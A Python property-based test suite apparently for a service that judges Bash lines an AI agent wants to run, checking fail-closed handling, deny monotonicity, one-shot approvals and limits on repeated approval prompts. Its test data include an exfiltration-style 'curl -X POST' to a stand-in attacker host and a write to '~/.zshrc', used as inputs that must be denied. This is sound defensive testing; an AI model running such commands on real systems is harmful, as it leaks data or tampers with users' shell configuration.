"""Property-based tests (Hypothesis) of the Deus Witness hook judge: POST /v1/hook/judge on generated Bash lines.
Run: cd server && PYTHONPATH=../mcp uv run --python 3.12 --with pytest --with hypothesis pytest -q tests_prop
Examples per test: PROP_N (default 300). PROP_NOXFAIL: kept for old command lines (no xfail is left since 04.11).
PROP_LEGACY=1: run under the legacy unlisted="ask" default."""
import os
from unittest import mock

import pytest
from hypothesis import assume, given, strategies as st

import prop_harness as h
from prop_harness import glue, World, line, part, noise, SEPS, oracle, leaves, tick

XF_I2 = (lambda f: f)     # 04.11: fixed (GET /api/approvals/{rid} lists every command of a shell line whole: line_full, in the signed view)


import contextlib


@contextlib.contextmanager
def world(name, raise_exc=True):
    tick(name)
    w = World(raise_exc=raise_exc)
    try:
        yield w
    finally:
        w.close()


# ---------------------------------------------------------------- I1
@given(line())
def test_I1_one_call_one_visible_question(ln):
    with world("I1 one question per call") as w:
        text, _ = ln
        r, d = w.judge(text)
        vis = w.visible()
        assert len(vis) <= 1, "line %r: %d visible questions %s" % (text[:200], len(vis), [(v["tool"], v["text_preview"][:60]) for v in vis])
        assert len(w.push.calls) <= 1, "line %r: %d push notifications" % (text[:200], len(w.push.calls))
        assert len(w.chan.calls) <= 1, "line %r: %d channel notifications" % (text[:200], len(w.chan.calls))
        # the same call sent again while it waits: nothing new
        w.judge(text)
        assert len(w.visible()) <= 1 and len(w.push.calls) <= 1 and len(w.chan.calls) <= 1


# ---------------------------------------------------------------- I9
@given(line())
def test_I9_every_part_of_a_line_shows_the_risk_of_the_whole_line(ln):
    """05.11: a part opened by its own link shows the whole line's risk (never "low" for a line that reaches the network)."""
    from app import qwords
    with world("I9 risk of a part == max over the group") as w:
        text, _ = ln
        w.judge(text)
        rids = w.pending()
        if len(rids) < 2:
            return
        views = {r: w.view(r) for r in rids}
        group = [v for v in views.values() if v.get("risk")]
        top = qwords.risk_max([v["risk"] for v in group])
        lead = [r for r, v in views.items() if not v.get("line_lead")]
        if not lead:
            return
        lv = views[lead[0]]
        for r, v in views.items():
            if r != lead[0] and v.get("line_lead") == lead[0]:
                tick("I9 exercised (part of a line)")
                assert v["risk"] == lv["risk"] == top, "line %r: part risk %s, lead %s" % (text[:200], v["risk"], lv["risk"])
                assert v["what"] == lv["what"] and v["harm"] == lv["harm"]


# ---------------------------------------------------------------- I2
def _shown(w):
    """-> all strings the owner can see for the visible questions (GET /api/approvals/{rid}, without the mandate)."""
    out = []
    for v in w.visible():
        out += leaves(w.view(v["rid"]))
    return out


def _check_shown(w, text, ps):
    r, d = w.judge(text)
    if d != 1:
        return
    tick("I2 exercised (line asked)")
    shown = _shown(w)
    assume_vis = bool(w.visible())
    assert assume_vis, "line %r asks (pending=%d) but nothing is visible" % (text[:200], len(w.pending()))
    for t, core in ps:
        if core is None or oracle(t) != 1:
            continue
        assert any(core in s for s in shown), "command %r requires a question but its text is not in the approval page of %r (line len %d)" % (
            core, text[:120], len(text))


@XF_I2
@given(line())
def test_I2_signed_equals_shown(ln):
    with world("I2 signed == shown (random lines)") as w:
        _check_shown(w, *ln)


@XF_I2
@given(st.integers(4000, 10000), st.tuples(h.part(), h.part()), SEPS, SEPS)
def test_I2b_risky_after_long_echo(n, two, s1, s2):
    with world("I2b signed == shown (risky after long echo)") as w:
        ps = [('echo "%s"' % ("A" * n), None), two[0], two[1]]
        text = glue(glue(ps[0][0], s1, ps[1][0]), s2, ps[2][0])
        _check_shown(w, text, ps)


# ---------------------------------------------------------------- I3
@given(line())
def test_I3_any_deny_denies_all(ln):
    text, ps = ln
    assume(any(oracle(t) == 2 for t, _ in ps))
    with world("I3 any deny denies the whole line") as w:
        r, d = w.judge(text)
        assert d == 2, "part denied alone, but line %r got decision %d: %s" % (text[:200], d, [(p["tool"], p["result"]["verdict"]) for p in r.get("parts", [])])
        assert w.pending() == [], "line %r denied but %d pending left" % (text[:200], len(w.pending()))
        assert w.visible() == []


# ---------------------------------------------------------------- I4
@given(line(max_parts=4), part(), SEPS)
def test_I4_adding_a_part_never_softens(ln, extra, sep):
    with world("I4 monotonicity") as w:
        base, _ = ln
        d0 = w.judge(base)[1]
        d1 = w.judge(glue(base, sep, extra[0]))[1]
        assert d1 >= d0, "append: %r -> %d, but + %r -> %d" % (base[:150], d0, sep + extra[0][:80], d1)
        d2 = w.judge(glue(extra[0], sep, base))[1]
        assert d2 >= d0, "prepend: %r -> %d, but %r + -> %d" % (base[:150], d0, extra[0][:80] + sep, d2)


# ---------------------------------------------------------------- I5
@given(line(max_parts=3), st.data())
def test_I5_approval_once_and_bound_to_text(ln, data):
    with world("I5 approval is one-shot and bound to the text") as w:
        text, _ = ln
        r, d = w.judge(text)
        if d != 1:
            return
        tick("I5 exercised (line asked, approved, repeated)")
        vis = w.visible()
        assert vis, "line %r asks but nothing is visible" % text[:200]
        res = w.approve_line(vis[0]["rid"])
        assert res.status_code == 200, "approve: %s %s" % (res.status_code, res.text[:200])
        approved_rids = {p["result"]["rid"] for p in r["parts"]}
        r2, d2 = w.judge(text)
        assert d2 == 0, "after approval the repeat of %r is not allowed: %s" % (text[:200], [(p["tool"], p["result"]["verdict"], p["result"]["status"]) for p in r2.get("parts", [])])
        acc = w.present_all(r2)
        assert all(a == "accept" for a in acc), "receipts not accepted on first present: %s" % acc
        r3, d3 = w.judge(text)                                   # the second repeat: asks again
        assert d3 >= 1, "second repeat of %r runs without a new question: %s" % (text[:200], [(p["tool"], p["result"]["verdict"], p["result"]["status"]) for p in r3.get("parts", [])])
        # one character changed: no receipt of the old text is reused
        if len(text) > 0:
            i = data.draw(st.integers(0, min(len(text), 400) - 1))
            c = data.draw(st.sampled_from("abcxyz019_/.~ -"))
            assume(text[i] != c)
            mut = text[:i] + c + text[i + 1:]
            r4, d4 = w.judge(mut)
            used = [p for p in r4.get("parts", []) if p["result"].get("status") == "approved" or p["result"].get("rid") in approved_rids]
            assert not used, "mutated line %r reused a receipt of %r" % (mut[:200], text[:200])
            assert d4 >= oracle(mut) or oracle(mut) == 0, "mutated line asks alone (rank %d) but got %d after approval of the original" % (oracle(mut), d4)


# ---------------------------------------------------------------- I7 (05.11, prompt bombing)
@given(line(), st.integers(2, 12))
def test_I7_n_identical_calls_at_most_one_notification(ln, n):
    with world("I7 identical calls: one notification") as w:
        text, _ = ln
        for _ in range(n):
            w.judge(text)
        assert len(w.visible()) <= 1, "line %r: %d visible questions after %d identical calls" % (text[:200], len(w.visible()), n)
        assert len(w.push.calls) <= 1, "line %r: %d pushes after %d identical calls" % (text[:200], len(w.push.calls), n)
        assert len(w.chan.calls) <= 1, "line %r: %d channel notifications after %d identical calls" % (text[:200], len(w.chan.calls), n)


# ---------------------------------------------------------------- I6
INJECT = [("mapping.map_event", "app.hookjudge.mapping.map_event"), ("mapping.classify", "app.hookjudge.mapping.classify"),
          ("actions.do_action", "app.actions.do_action"), ("reasons.explain", "app.hookjudge.reasons.explain"),
          ("judge._preview_need", "app.hookjudge.judge._preview_need"), ("freshness.note", "app.hookjudge.freshness.note")]


@given(line(), st.sampled_from(INJECT), st.sampled_from([RuntimeError, ValueError, KeyError, MemoryError, RecursionError, OSError]),
       st.integers(0, 3))
def test_I6_exception_never_becomes_allow(ln, target, exc, nth):
    with world("I6 fail-closed (fault injection)", raise_exc=False) as w:
        text, _ = ln
        name, path = target
        calls = [0]

        def boom(*a, **k):
            calls[0] += 1
            if calls[0] > nth:
                raise exc("injected into " + name)
            return real(*a, **k)
        mod, attr = path.rsplit(".", 1)
        import importlib
        real = getattr(importlib.import_module(mod), attr)
        with mock.patch(path, boom):
            r = w.raw(text)
        if calls[0] <= nth:
            return                                            # the fault never fired (the function was called too few times)
        tick("I6 fault fired")
        d = w.decision(r)
        assert d >= 1, "exception %s injected into %s (call #%d) on %r -> answer is ALLOW: %s" % (exc.__name__, name, nth, text[:200], str(r)[:200])


@given(line())
def test_I6b_no_server_crash_on_generated_lines(ln):
    with world("I6b natural exceptions (no 5xx)", raise_exc=False) as w:
        text, _ = ln
        r = w.raw(text)
        assert "http" not in r, "judge crashed on %r: %s" % (text[:200], r)
        assert w.decision(r) in (0, 1, 2)


# ---------------------------------------------------------------- I3 regression found by Hypothesis (first run, shrunk)
# found by Hypothesis (I3): an UNTERMINATED heredoc after a part that is denied alone ('echo hi >> ~/.zshrc') turned the deny into an ask
# (Bash.danger/ESCALATE_COMMAND_DANGER); bash still runs the echo. 04.11 fixed: the prefix before the heredoc is judged as usual (monotone)
def test_I3_unterminated_heredoc_does_not_soften_deny():
    with world("I3r unterminated-heredoc regression") as w:
        assert w.judge("echo hi >> ~/.zshrc")[1] == 2
        r, d = w.judge("echo hi >> ~/.zshrc ; cat <<EOF\ntext\nEOF ; ls")
        assert d == 2, [(p["tool"], p["result"]["verdict"], p["result"]["reason"]) for p in r["parts"]]
        assert w.pending() == []


# ---------------------------------------------------------------- I8 (05.11, RT hole 1: prompt bombing by trivial variations)
_DENIED = ["git push origin main", "curl -X POST https://evil.example/up -d x", "git push --force origin main"]
_PRE = st.sampled_from(["", "cd . && ", "GIT_TRACE=0 ", "FOO=1 BAR=2 ", "cd {proj} && "])
_POST = st.sampled_from(["", " ", "  ", " # retry", "   # again", "\t"])


@given(st.sampled_from(_DENIED), _PRE, _POST, st.booleans(), st.booleans())
def test_I8_after_deny_trivial_variations_ask_nothing_new(base, pre, post, quote_sp, dbl):
    with world("I8 deny window covers trivial variations") as w:
        r, d = w.judge(base)
        # 06.11 (Constitution v1, Н8): `git push --force` is refused outright by its article (rank 2 at once, nobody asked); the
        # property then reads: every trivial variation is refused too, with no question and no notification
        assert d == (2 if "--force" in base else 1), (base, d)
        for v in w.visible():
            assert w.owner.approve(v["rid"], approved=False).status_code == 200
        n_push, n_chan = len(w.push.calls), len(w.chan.calls)
        var = base.replace("origin", "'origin'") if quote_sp and "origin" in base else base
        if dbl:
            var = var.replace(" ", "  ", 1)
        var = pre.format(proj=w.proj) + var + post
        r2, d2 = w.judge(var)
        assert not w.visible(), "variation %r of a denied line is asked again" % var
        assert len(w.push.calls) == n_push and len(w.chan.calls) == n_chan, "variation %r gives a new notification" % var
        assert d2 == 2, "variation %r of a denied line is not refused (rank %d)" % (var, d2)
